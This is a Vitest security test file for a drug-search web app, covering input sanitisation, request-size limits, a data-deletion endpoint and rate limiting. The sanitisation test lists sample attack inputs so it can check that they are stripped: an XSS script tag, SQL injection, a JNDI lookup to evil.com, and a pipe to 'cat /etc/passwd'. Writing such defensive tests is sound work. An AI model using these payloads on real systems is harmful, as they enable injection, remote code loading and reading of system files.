import { describe, it, expect } from 'vitest';
import { checkRateLimit, sanitizeDrugInput, sanitizeConditionInput } from '@/lib/network';
import { GET as searchGet } from '@/app/api/drugs/search/route';
import { GET as researchGet } from '@/app/api/drugs/research/route';
import { POST as aiSummaryPost } from '@/app/api/repurposing/ai-summary/route';
import { POST as deleteDataPost } from '@/app/api/user/delete-data/route';
import { NextRequest } from 'next/server';

describe('API Security, Input Validation & Rate Limiting', () => {
  describe('Input Sanitization & Injection Prevention', () => {
    it('strips script tags and special injection characters from drug queries', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>aspirin',
        'aspirin; DROP TABLE drugs; --',
        'aspirin${jndi:ldap://evil.com/a}',
        'aspirin\x00\x1b[31m',
        'aspirin | cat /etc/passwd',
      ];

      for (const input of maliciousInputs) {
        const cleaned = sanitizeDrugInput(input);
        expect(cleaned).not.toContain('<script>');
        expect(cleaned).not.toContain(';');
        expect(cleaned).not.toContain('$');
        expect(cleaned).not.toContain('|');
        expect(cleaned).not.toContain('\x00');
        expect(cleaned.length).toBeLessThanOrEqual(80);
      }
    });

    it('enforces maximum length bounds on drug and condition inputs', () => {
      const oversizedDrug = 'a'.repeat(200);
      const cleaned = sanitizeDrugInput(oversizedDrug);
      expect(cleaned.length).toBe(80);

      const oversizedCondition = 'b'.repeat(200);
      const cleanedCondition = sanitizeConditionInput(oversizedCondition);
      expect(cleanedCondition.length).toBe(100);
    });
  });

  describe('API Route Bounds & Payload Limits', () => {
    it('rejects oversized search queries with 400 Bad Request', async () => {
      const longQuery = 'a'.repeat(120);
      const req = new NextRequest(`http://localhost:3000/api/drugs/search?q=${longQuery}`);
      const res = await searchGet(req);
      expect(res.status).toBe(400);

      const data = await res.json();
      expect(data.error).toContain('exceeds maximum allowed length');
    });

    it('rejects oversized research queries with 400 Bad Request', async () => {
      const longDrug = 'b'.repeat(120);
      const req = new NextRequest(`http://localhost:3000/api/drugs/research?drug=${longDrug}`);
      const res = await researchGet(req);
      expect(res.status).toBe(400);

      const data = await res.json();
      expect(data.error).toContain('exceeds maximum allowed length');
    });

    it('rejects malformed AI summary payloads with 400 Bad Request', async () => {
      const req = new NextRequest('http://localhost:3000/api/repurposing/ai-summary', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ invalidField: 'test' }),
      });

      const res = await aiSummaryPost(req);
      expect(res.status).toBe(400);

      const data = await res.json();
      expect(data.error).toContain('Invalid payload');
    });

    it('rejects oversized AI summary payloads exceeding 50KB with 413 Payload Too Large', async () => {
      const largePayload = {
        drug: { genericName: 'Metformin', approvedIndications: [] },
        candidate: { condition: 'Cancer', clinicalTrials: [], citations: [] },
        extraPadding: 'x'.repeat(60 * 1024),
      };

      const req = new NextRequest('http://localhost:3000/api/repurposing/ai-summary', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': String(JSON.stringify(largePayload).length),
        },
        body: JSON.stringify(largePayload),
      });

      const res = await aiSummaryPost(req);
      expect(res.status).toBe(413);
    });

    it('supports user data deletion endpoint for privacy compliance', async () => {
      const req = new NextRequest('http://localhost:3000/api/user/delete-data', {
        method: 'POST',
        headers: { 'Authorization': 'Bearer test-token' },
      });

      const res = await deleteDataPost(req);
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.retentionPolicy).toBeDefined();
    });
  });

  describe('Sliding Window Rate Limiter', () => {
    it('throttles requests when threshold is exceeded and returns reset time', () => {
      const testKey = `test-ip-${Date.now()}`;
      const limit = 5;

      for (let i = 0; i < limit; i++) {
        const check = checkRateLimit(testKey, limit, 10_000);
        expect(check.allowed).toBe(true);
      }

      // 6th request should be blocked
      const blocked = checkRateLimit(testKey, limit, 10_000);
      expect(blocked.allowed).toBe(false);
      expect(blocked.remaining).toBe(0);
      expect(blocked.resetMs).toBeGreaterThan(0);
    });
  });
});
